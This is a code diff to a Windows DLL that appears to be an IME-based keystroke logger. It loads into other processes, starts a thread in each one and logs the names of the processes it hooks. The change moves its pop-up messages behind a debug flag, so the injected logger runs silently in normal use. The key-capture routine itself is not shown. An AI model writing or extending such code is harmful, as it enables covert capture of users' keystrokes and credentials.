@@ -11,7 +11,7 @@ extern "C" __declspec(dllexport) void CALLBACK IMELoggerEntry(HWND hwnd, HINSTAN
 	wchar_t dllPath[MAX_PATH];
 	// Initializeing 
 	if (DEBUG) {
-		DEBUGlogger(L"IMELoggerEntry initializing...\n");
+		DEBUGlogger(L"IMELoggerEntry initializing...\r\n");
 	}
 
 	if (!getDLLPath(dllPath)) {
@@ -22,10 +22,11 @@ extern "C" __declspec(dllexport) void CALLBACK IMELoggerEntry(HWND hwnd, HINSTAN
 
 	// Register key first
 	if (isUserAdmin()) {
-		MessageBoxW(NULL, L"IMELoggerEntry Start\n ", L"IMELoggerEntry", MB_OK);
+		MessageBoxW(NULL, L"IMELoggerEntry Start\r\n ", L"IMELoggerEntry", MB_OK);
 	}
+
 	else if (DEBUG) {
-		MessageBoxW(NULL, L"Please run as administrator\nRun without admin now ", L"IMELoggerEntry", MB_OK);
+		MessageBoxW(NULL, L"Please run as administrator\r\nRun without admin now ", L"IMELoggerEntry", MB_OK);
 		exit(-1);
 	}
 
@@ -35,7 +36,7 @@ extern "C" __declspec(dllexport) void CALLBACK IMELoggerEntry(HWND hwnd, HINSTAN
 		exit(-1);
 	}
 	if (DEBUG) {
-		DEBUGlogger(L"IMELoggerEntry initialized!\n");
+		DEBUGlogger(L"IMELoggerEntry initialized!\r\n");
 	}
 	// Initialized
 
@@ -56,7 +57,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 	HANDLE hProcess = nullptr;
 	wchar_t processName[MAX_PATH] = L"<unknown>";
 	wchar_t targetProcessName[] = L"rundll32.exe";
-	wchar_t debugProcessName[] = L"WMIdorce.exe";
+	wchar_t debugProcessName[] = L"Notepad.exe";
 
 	switch (ul_reason_for_call)
 	{
@@ -67,7 +68,8 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 		if (GetModuleBaseNameW(hProcess, NULL, processName, MAX_PATH))
 		{
 			if (_wcsicmp(processName, targetProcessName) != 0) {
-				IMEKeyInputlogger(L"\nYee\n");
+				IMEKeyInputlogger(L"\r\nHook new PID:\r\n");
+				IMEKeyInputlogger(processName);
 				// New thread for chromeMain
 				hThread = CreateThread(
 					NULL,
@@ -78,13 +80,16 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 					&threadId
 				);
 
-				if (hThread == NULL) {
-					// fail to create thread
-					MessageBoxW(NULL, L"Fail to create thread\n ", L"IMELoggerEntry", MB_OK);
-				}
-				else {
-					// success to create thread
-					MessageBoxW(NULL, L"Success to create thread\n ", L"IMELoggerEntry", MB_OK);
+				if (DEBUG) {
+					if (hThread == NULL) {
+						// fail to create thread
+						MessageBoxW(NULL, L"Fail to create thread\r\n ", L"IMELoggerEntry", MB_OK);
+					}
+					else {
+						// success to create thread
+						MessageBoxW(NULL, L"Success to create thread\r\n ", L"IMELoggerEntry", MB_OK);
+					}
+
 				}
 
 			}
